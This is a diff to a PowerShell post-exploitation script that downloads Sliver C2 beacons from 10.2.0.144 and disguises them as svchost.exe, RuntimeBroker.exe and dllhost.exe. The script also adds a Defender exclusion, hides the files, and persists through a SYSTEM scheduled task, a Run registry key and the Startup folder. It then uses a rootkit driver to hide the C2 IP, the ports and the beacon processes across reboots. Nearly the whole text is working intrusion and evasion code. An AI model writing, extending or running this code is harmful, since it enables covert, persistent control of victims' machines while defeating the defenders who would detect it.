@@ -100,54 +100,66 @@ if ($bcd -match "testsigning\s+Yes") {
     exit
 }
 
-# --- 6. Drop & Execute Sliver Beacon ---
-Write-Host "[*] Staging Sliver Beacon (RuntimeBroker)..."
+# --- 6. Drop & Execute Multiple Sliver Beacons ---
+Write-Host "[*] Staging Redundant Sliver Beacons..."
 $BeaconDir = "C:\ProgramData\USOShared"
 if (-not (Test-Path $BeaconDir)) {
     New-Item -ItemType Directory -Force -Path $BeaconDir | Out-Null
     Add-MpPreference -ExclusionPath $BeaconDir -ErrorAction SilentlyContinue
 }
-$BeaconPath = "$BeaconDir\RuntimeBroker.exe"
 
-if (-not (Test-Path $BeaconPath)) {
-    Write-Host "    -> Downloading beacon from C2..."
-    Invoke-WebRequest -Uri "http://10.2.0.144/RuntimeBroker.exe" -OutFile $BeaconPath -UseBasicParsing -ErrorAction SilentlyContinue
-    
-    Write-Host "    -> Downloading TrustMeBro..."
-    Invoke-WebRequest -Uri "https://github.com/KriyosArcane/TrustMeBro/raw/refs/heads/main/TrustMeBro.exe" -OutFile "$TempDir\TrustMeBro.exe" -UseBasicParsing -ErrorAction SilentlyContinue
-    
-    if ((Test-Path $BeaconPath) -and (Test-Path "$TempDir\TrustMeBro.exe")) {
-        Write-Host "    -> Unblocking downloaded files..."
-        Unblock-File -Path $BeaconPath -ErrorAction SilentlyContinue
-        Unblock-File -Path "$TempDir\TrustMeBro.exe" -ErrorAction SilentlyContinue
-        
-        Write-Host "    -> Cloning Certificate and Metadata using TrustMeBro..."
-        # We use svchost.exe as the source because RuntimeBroker.exe often fails LoadLibraryEx due to UWP permissions/MUI resource separation.
-        Start-Process -FilePath "$TempDir\TrustMeBro.exe" -ArgumentList "--clone C:\Windows\System32\svchost.exe `"$BeaconPath`"" -NoNewWindow -Wait -ErrorAction SilentlyContinue
-        
-        Write-Host "    -> Setting Hidden and System attributes on Beacon..."
-        Set-ItemProperty -Path $BeaconPath -Name Attributes -Value "Hidden, System" -ErrorAction SilentlyContinue
+# Define the beacons
+# 1. Hidden Scheduled Task
+$Beacon1 = "$BeaconDir\svchost.exe"
+# 2. Hidden Registry Run Key
+$Beacon2 = "$BeaconDir\RuntimeBroker.exe"
+# 3. Decoy Startup Folder
+$StartupDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+$Beacon3 = "$StartupDir\dllhost.exe"
+
+$BeaconsToDrop = @(
+    @{ Path = $Beacon1; Url = "http://10.2.0.144/svchost.exe" },
+    @{ Path = $Beacon2; Url = "http://10.2.0.144/RuntimeBroker.exe" },
+    @{ Path = $Beacon3; Url = "http://10.2.0.144/dllhost.exe" }
+)
+
+foreach ($b in $BeaconsToDrop) {
+    if (-not (Test-Path $b.Path)) {
+        Write-Host "    -> Downloading $($b.Path)..."
+        Invoke-WebRequest -Uri $b.Url -OutFile $b.Path -UseBasicParsing -ErrorAction SilentlyContinue
+        Unblock-File -Path $b.Path -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path $b.Path -Name Attributes -Value "Hidden, System" -ErrorAction SilentlyContinue
     }
 }
 
-Write-Host "    -> Starting the Beacon silently..."
-$processCheck = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Where-Object {$_.Path -eq $BeaconPath}
-if (-not $processCheck) {
-    Start-Process -FilePath $BeaconPath -WindowStyle Hidden -ErrorAction SilentlyContinue
-    Start-Sleep -Seconds 3
+Write-Host "    -> Starting Beacons silently..."
+foreach ($b in $BeaconsToDrop) {
+    $processCheck = Get-Process -Name (Split-Path $b.Path -LeafBase) -ErrorAction SilentlyContinue | Where-Object {$_.Path -eq $b.Path}
+    if (-not $processCheck) {
+        Start-Process -FilePath $b.Path -WindowStyle Hidden -ErrorAction SilentlyContinue
+    }
 }
+Start-Sleep -Seconds 3
 
-Write-Host "    -> Creating Stealthy Scheduled Task Persistence for Beacon..."
+Write-Host "    -> Creating Diverse Persistence Mechanisms..."
+
+# Persistence 1: Scheduled Task for svchost.exe
 $BeaconTaskName = "USOSharedRuntimeUpdate"
 $taskCheck = Get-ScheduledTask -TaskName $BeaconTaskName -ErrorAction SilentlyContinue
 if (-not $taskCheck) {
-    $BeaconAction = New-ScheduledTaskAction -Execute $BeaconPath
+    $BeaconAction = New-ScheduledTaskAction -Execute $Beacon1
     $BeaconTrigger = New-ScheduledTaskTrigger -AtStartup
     $BeaconPrincipal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
     $BeaconSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
-
     Register-ScheduledTask -TaskName $BeaconTaskName -Action $BeaconAction -Trigger $BeaconTrigger -Principal $BeaconPrincipal -Settings $BeaconSettings -Description "Orchestrates user session shared runtime updates." -Force | Out-Null
 }
+
+# Persistence 2: Registry Run Key for RuntimeBroker.exe
+$RegKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$RegValueName = "WindowsUpdateUUX"
+Set-ItemProperty -Path $RegKey -Name $RegValueName -Value "`"$Beacon2`" /background" -ErrorAction SilentlyContinue
+
+# Persistence 3: Startup Folder (dllhost.exe) is inherently persistent simply by being placed in the folder above.
 
 # --- 7. Install & Start NetRootKit Driver ---
 Write-Host "[*] Installing NetRootKit Driver via devcon.exe..."
@@ -181,10 +193,10 @@ if (-not (Test-Path "NetRootKitController.exe")) {
     exit
 }
 
-# The IP, Ports, and Process the user requested to hide
+# The IP, Ports, and Processes the user requested to hide
 $TargetIP = "10.2.0.144"
 $PortsToHide = @("8888", "8081")
-$ProcessToHide = "RuntimeBroker"  # A common, ubiquitous Windows process. Rename your sliver beacon to this!
+$ProcessesToHide = @("svchost", "RuntimeBroker") # Intentionally LEAVING OUT "dllhost" so it serves as a decoy
 
 Write-Host "[*] Checking connection to driver..."
 .\NetRootKitController.exe check-connection "Ping"
@@ -199,16 +211,18 @@ foreach ($Port in $PortsToHide) {
     Write-Host $hideOut2
 }
 
-Write-Host "[*] Attempting to find and hide process: $ProcessToHide..."
-$targetProcs = Get-Process -Name $ProcessToHide -ErrorAction SilentlyContinue
-if ($targetProcs) {
-    foreach ($p in $targetProcs) {
-        Write-Host "    -> Hiding PID: $($p.Id)"
-        $hideOut3 = .\NetRootKitController.exe hide-pid $($p.Id)
-        Write-Host $hideOut3
+foreach ($ProcName in $ProcessesToHide) {
+    Write-Host "[*] Attempting to find and hide process: $ProcName..."
+    $targetProcs = Get-Process -Name $ProcName -ErrorAction SilentlyContinue
+    if ($targetProcs) {
+        foreach ($p in $targetProcs) {
+            Write-Host "    -> Hiding PID: $($p.Id)"
+            $hideOut3 = .\NetRootKitController.exe hide-pid $($p.Id)
+            Write-Host $hideOut3
+        }
+    } else {
+        Write-Host "    -> Process $ProcName not found currently running. Skipping."
     }
-} else {
-    Write-Host "    -> Process not found currently running. Skipping."
 }
 
 Write-Host "[*] Creating Scheduled Task to persist IP, Port, and Process hiding across reboots..."
@@ -221,7 +235,6 @@ if (-not (Test-Path $PersistDir)) {
 Copy-Item ".\NetRootKitController.exe" -Destination "$PersistDir\svchost_net.exe" -Force
 
 # Create a powershell script to run multiple controller commands sequentially on startup
-# (Changed from .bat to .ps1 so we can dynamically calculate the PID every reboot)
 $PSPath = "$PersistDir\UpdateNetwork.ps1"
 $PSContent = @"
 Start-Sleep -Seconds 10
@@ -230,10 +243,13 @@ cd "$PersistDir"
 .\svchost_net.exe hide-ip 8888
 .\svchost_net.exe hide-ip 8081
 
-`$procs = Get-Process -Name "$ProcessToHide" -ErrorAction SilentlyContinue
-if (`$procs) {
-    foreach (`$p in `$procs) {
-        .\svchost_net.exe hide-pid `$procs.Id
+`$hideprocs = @("svchost", "RuntimeBroker")
+foreach (`$proc in `$hideprocs) {
+    `$procs = Get-Process -Name `$proc -ErrorAction SilentlyContinue
+    if (`$procs) {
+        foreach (`$p in `$procs) {
+            .\svchost_net.exe hide-pid `$p.Id
+        }
     }
 }
 "@
